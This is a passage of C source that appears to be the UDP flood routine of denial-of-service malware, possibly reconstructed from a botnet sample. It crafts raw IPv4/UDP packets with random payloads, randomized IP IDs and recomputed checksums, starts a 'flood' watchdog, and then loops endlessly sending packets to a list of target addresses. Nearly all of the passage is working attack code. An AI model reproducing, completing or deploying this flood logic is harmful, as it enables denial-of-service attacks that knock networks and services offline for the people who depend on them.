    write_be16(packet + 22, (uint16_t)actual_destination_port);

    uint32_t length = payload_length;
    if (payload == NULL) {
        if (length == 0) {
            length = (uint32_t)prng_range(0x200, 0x400);
        }
        prng_bytes(packet + 28, (int32_t)length);
    } else {
        memcpy(packet + 28, payload, length);
    }

    write_be16(packet + 2, (uint16_t)(length + 0x1c));
    write_be16(packet + 4, (uint16_t)prng_range(1, 0xffff));
    write_be16(packet + 24, (uint16_t)(length + 8));
    packet[26] = 0;
    packet[27] = 0;
    refresh_ipv4_checksum(packet);

    (void)flood_spawn_watchdog(watchdog_delay);

    for (;;) {
        for (int32_t i = 0; i < target_count; ++i) {
            destination.sin_addr.s_addr = randomized_target_address(&targets[i]);
            (void)sendto(fd, packet, length + 0x1c, 0,
                         (struct sockaddr *)&destination, sizeof(destination));
            if (packet_delay_us != 0) {
                (void)usleep((useconds_t)packet_delay_us);
            }
        }
    }
}
